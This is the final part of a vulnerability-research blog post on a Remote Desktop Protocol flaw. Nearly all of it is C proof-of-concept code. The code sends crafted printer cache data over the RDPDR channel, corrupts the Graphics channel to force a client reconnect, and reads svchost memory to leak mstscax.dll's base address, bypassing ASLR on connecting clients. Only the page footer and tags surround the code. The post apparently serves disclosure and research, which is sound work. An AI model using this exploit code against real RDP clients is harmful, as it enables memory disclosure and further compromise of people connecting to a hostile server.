</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#ae81ff>0x42</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x72</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x6f</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x74</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x68</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x65</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x72</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x20</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x44</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x43</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x50</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x2d</span>,
</span></span><span style=display:flex><span>        <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x31</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x30</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x30</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x30</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x20</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x55</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x53</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x42</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x20</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x61</span>, <span style=color:#ae81ff>0x62</span>, <span style=color:#ae81ff>0x63</span>, <span style=color:#ae81ff>0x64</span>};
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>hook_to_rdp</span>();
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// Connect to RDPDR channel
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>connect_to_virtual_channel</span>(<span style=color:#e6db74>&#34;rdpdr&#34;</span>, <span style=color:#ae81ff>10</span>, STATIC_CHANNEL))
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// Add Printer Cachedata to client registry, several times to increase probability of success
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> k <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; k <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>32</span>; k<span style=color:#f92672>++</span>)
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>write_to_virtual_channel</span>(leak_heap, <span style=color:#66d9ef>sizeof</span>(leak_heap));
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>Sleep</span>(<span style=color:#ae81ff>200</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// Close RDPDR channel
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#a6e22e>close_virtual_channel</span>();
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// Trick the client into reconnecting by corrupting the Graphics channel
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#75715e>// Sometimes it reconnects automatically, sometimes it requires manual action...
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>connect_to_virtual_channel</span>(<span style=color:#e6db74>&#34;Microsoft::Windows::RDS::Graphics&#34;</span>, <span style=color:#ae81ff>10</span>, DYNAMIC_CHANNEL))
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>write_to_virtual_channel</span>(<span style=color:#e6db74>&#34;fuzzed up beyond all repair&#34;</span>, <span style=color:#ae81ff>27</span>);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>close_virtual_channel</span>();
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// Wait for the client to reconnect
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#a6e22e>Sleep</span>(<span style=color:#ae81ff>20000</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// The client will send a Device List Announcement upon initialization
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#75715e>// Retrieve the Device List Announcement (DR_PRN_DEVICE_ANNOUNCE) from svchost memory
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>    svchostPid <span style=color:#f92672>=</span> <span style=color:#a6e22e>get_termservice_pid</span>();
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>svchostPid)
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    hProcess <span style=color:#f92672>=</span> <span style=color:#a6e22e>OpenProcess</span>(PROCESS_VM_READ <span style=color:#f92672>|</span> PROCESS_QUERY_INFORMATION, <span style=color:#ae81ff>0</span>, svchostPid);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>hProcess)
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;[x] Could not open svchost process. (%lu)</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, <span style=color:#a6e22e>GetLastError</span>());
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>p <span style=color:#f92672>=</span> NULL; <span style=color:#a6e22e>VirtualQueryEx</span>(hProcess, p, <span style=color:#f92672>&amp;</span>info, <span style=color:#66d9ef>sizeof</span>(info)); p <span style=color:#f92672>+=</span> info.RegionSize)
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (info.State <span style=color:#f92672>==</span> MEM_COMMIT <span style=color:#f92672>&amp;&amp;</span> info.Protect <span style=color:#f92672>!=</span> PAGE_NOACCESS <span style=color:#f92672>&amp;&amp;</span> info.Protect <span style=color:#f92672>!=</span> PAGE_GUARD)
</span></span><span style=display:flex><span>        {
</span></span><span style=display:flex><span>            buffer <span style=color:#f92672>=</span> <span style=color:#a6e22e>malloc</span>(info.RegionSize);
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>ReadProcessMemory</span>(hProcess, info.BaseAddress, buffer, info.RegionSize, <span style=color:#f92672>&amp;</span>bytesRead);
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; i <span style=color:#f92672>&lt;</span> bytesRead; i<span style=color:#f92672>++</span>)
</span></span><span style=display:flex><span>            {
</span></span><span style=display:flex><span>                leak <span style=color:#f92672>=</span> (BYTE <span style=color:#f92672>*</span>)buffer <span style=color:#f92672>+</span> i;
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>memcmp</span>((<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)leak, (<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)<span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;Brother&#34;</span>, <span style=color:#ae81ff>14</span>))
</span></span><span style=display:flex><span>                {
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> j <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; j <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>256</span>; j<span style=color:#f92672>++</span>)
</span></span><span style=display:flex><span>                    {
</span></span><span style=display:flex><span>                        <span style=color:#66d9ef>if</span> (leak[j <span style=color:#f92672>+</span> <span style=color:#ae81ff>7</span>] <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span> <span style=color:#f92672>&amp;&amp;</span> leak[j <span style=color:#f92672>+</span> <span style=color:#ae81ff>6</span>] <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span> <span style=color:#f92672>&amp;&amp;</span> leak[j <span style=color:#f92672>+</span> <span style=color:#ae81ff>5</span>] <span style=color:#f92672>==</span> <span style=color:#ae81ff>0x7f</span>)
</span></span><span style=display:flex><span>                        {
</span></span><span style=display:flex><span>                            <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;[+] Found address leak! 0x%p</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, <span style=color:#f92672>*</span>((<span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>)(leak <span style=color:#f92672>+</span> j)));
</span></span><span style=display:flex><span>                            <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> k <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; k <span style=color:#f92672>&lt;</span> <span style=color:#66d9ef>sizeof</span>(vtable_offsets) <span style=color:#f92672>/</span> <span style=color:#66d9ef>sizeof</span>(vtable_offsets[<span style=color:#ae81ff>0</span>]); k<span style=color:#f92672>++</span>)
</span></span><span style=display:flex><span>                            {
</span></span><span style=display:flex><span>                                <span style=color:#66d9ef>if</span> (((<span style=color:#f92672>*</span>((<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>long</span> <span style=color:#66d9ef>long</span> <span style=color:#f92672>*</span>)(leak <span style=color:#f92672>+</span> j))) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xFFFF</span>) <span style=color:#f92672>==</span> (vtable_offsets[k] <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xFFFF</span>))
</span></span><span style=display:flex><span>                                {
</span></span><span style=display:flex><span>                                    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;[+] -&gt; Potential base address for mstscax.dll: 0x%p</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, <span style=color:#f92672>*</span>((<span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>)(leak <span style=color:#f92672>+</span> j)) <span style=color:#f92672>-</span> vtable_offsets[k]);
</span></span><span style=display:flex><span>                                }
</span></span><span style=display:flex><span>                            }
</span></span><span style=display:flex><span>                            <span style=color:#75715e>// hexdump((char *)leak, 256);
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                        }
</span></span><span style=display:flex><span>                    }
</span></span><span style=display:flex><span>                }
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>free</span>(buffer);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>close_rdp</span>();
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div></div><footer class=post-footer><div class=post-footer-data><div class=tags><div class=tag><a href=/tags/rdp>#RDP</a></div><div class=tag><a href=/tags/exploit>#Exploit</a></div><div class=tag><a href=/tags/cve>#CVE</a></div><div class=tag><a href=/tags/vulnerability-research>#Vulnerability Research</a></div><div class=tag><a href=/tags/aslr>#ASLR</a></div></div><span class=date>2021-12-10
<span class=author>by
Valentino Ricotta</span></span></div></footer></article><footer><div class=social-links-footer><a href=mailto:contact@thalium.re><div class=social-link>Email</div></a><a href=https://github.com/thalium target=_blank><div class=social-link>GitHub</div></a><a href=https://twitter.com/thalium_team target=_blank><div class=social-link>Twitter</div></a></div><div class=copyright>Copyright (c) 2020, all rights reserved.</div><div class=poweredby>Powered by <a href=https://gohugo.io/>Hugo</a>.</div></footer></div></body></html>